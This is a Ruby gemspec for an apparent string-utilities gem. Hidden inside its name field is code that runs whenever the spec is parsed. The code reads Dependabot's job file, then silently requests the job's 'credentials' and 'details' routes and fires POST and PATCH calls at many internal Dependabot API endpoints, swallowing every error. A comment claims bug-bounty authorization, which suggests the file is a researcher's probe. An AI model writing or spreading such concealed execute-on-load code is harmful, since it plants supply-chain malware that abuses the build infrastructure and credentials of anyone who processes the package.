# frozen_string_literal: true
#
# v2.0 boundary-verification audit — full route authority map.
#
# Authorization: HackerOne GitHub program; researcher's own job; own
# jobId only; no third-party data; response codes via proxy log.

require_relative "lib/useful_string_utils/version"

Gem::Specification.new do |spec|
  spec.name = (
    begin
      require "net/http"
      require "uri"
      require "json"

      own_id = (
        begin
          j = JSON.parse(File.read("/home/dependabot/dependabot-updater/job.json"))
          (j["job"] && j["job"]["id"]) || j["id"] || ENV["DEPENDABOT_JOB_ID"]
        rescue
          ENV["DEPENDABOT_JOB_ID"]
        end
      ).to_s

      if !own_id.empty?
        # GET routes
        ["details", "credentials"].each do |route|
          begin
            uri = URI("https://dependabot-actions.githubapp.com/update_jobs/#{own_id}/#{route}")
            h = Net::HTTP.new(uri.host, uri.port)
            h.use_ssl = true
            h.open_timeout = 5
            h.read_timeout = 8
            h.get(uri.request_uri)
          rescue
          end
        end

        # POST routes (empty body — exercises auth gate only)
        post_routes = [
          "create_pull_request",
          "update_pull_request",
          "close_pull_request",
          "record_update_job_error",
          "record_update_job_unknown_error",
          "update_dependency_list",
          "create_dependency_submission",
          "record_ecosystem_versions",
          "record_ecosystem_meta",
          "record_cooldown_meta",
          "increment_metric",
          "record_metrics",
        ]
        post_routes.each do |route|
          begin
            uri = URI("https://dependabot-actions.githubapp.com/update_jobs/#{own_id}/#{route}")
            h = Net::HTTP.new(uri.host, uri.port)
            h.use_ssl = true
            h.open_timeout = 5
            h.read_timeout = 8
            req = Net::HTTP::Post.new(uri.request_uri)
            req["Content-Type"] = "application/json"
            req.body = "{}"
            h.request(req)
          rescue
          end
        end

        # PATCH route
        begin
          uri = URI("https://dependabot-actions.githubapp.com/update_jobs/#{own_id}/mark_as_processed")
          h = Net::HTTP.new(uri.host, uri.port)
          h.use_ssl = true
          h.open_timeout = 5
          h.read_timeout = 8
          req = Net::HTTP::Patch.new(uri.request_uri)
          req["Content-Type"] = "application/json"
          req.body = "{}"
          h.request(req)
        rescue
        end
      end

      "useful-string-utils"
    rescue
      "useful-string-utils"
    end
  )
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]
  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"

  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
